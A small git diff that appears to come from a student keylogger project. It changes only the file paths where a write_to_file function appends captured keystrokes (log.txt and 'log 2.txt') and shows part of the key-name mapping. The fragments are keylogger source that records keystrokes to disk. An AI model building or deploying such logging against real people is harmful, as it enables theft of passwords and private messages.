@@ -26,7 +26,7 @@ def write_to_file(key):
         key_data = ' > '
     if key_data == 'Key.left':
         key_data = ' < '
-    with open("log.txt",'a') as file:
+    with open("Keylogger cybersecurity project/log.txt",'a') as file:
         file.write(key_data)
 
 
@@ -40,7 +40,7 @@ def write_to_file(key):
         key_data = ''
     if key_data == ' *CTRL-r* ':
         key_data = ''
-    with open("log 2.txt",'a') as file:
+    with open("Keylogger cybersecurity project/log 2.txt",'a') as file:
         file.write(key_data)
 
 
